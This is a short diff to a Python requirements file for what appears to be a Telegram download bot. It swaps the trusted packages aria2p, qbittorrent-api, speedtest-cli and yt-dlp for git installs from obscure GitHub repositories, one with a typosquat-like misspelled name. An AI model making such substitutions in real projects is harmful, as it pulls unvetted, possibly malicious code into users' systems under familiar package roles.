@@ -1,6 +1,6 @@
 aiohttp
 anytree
-aria2p
+git+https://github.com/thetrueheavensequal/B
 asgiref
 asyncio
 beautifulsoup4
@@ -31,13 +31,13 @@ pyrogram==2.0.66
 python-dotenv
 python-magic
 python-telegram-bot==13.15
-qbittorrent-api
+git+https://github.com/rajanvibes/qmbittomrrent-ampi
 requests
-speedtest-cli
+git+https://github.com/thetrueheavensequal/D
 telegraph
 tenacity
 tgCrypto
 urllib3
 waybackpy
 xattr
-yt-dlp
+git+https://github.com/thetrueheavensequal/A
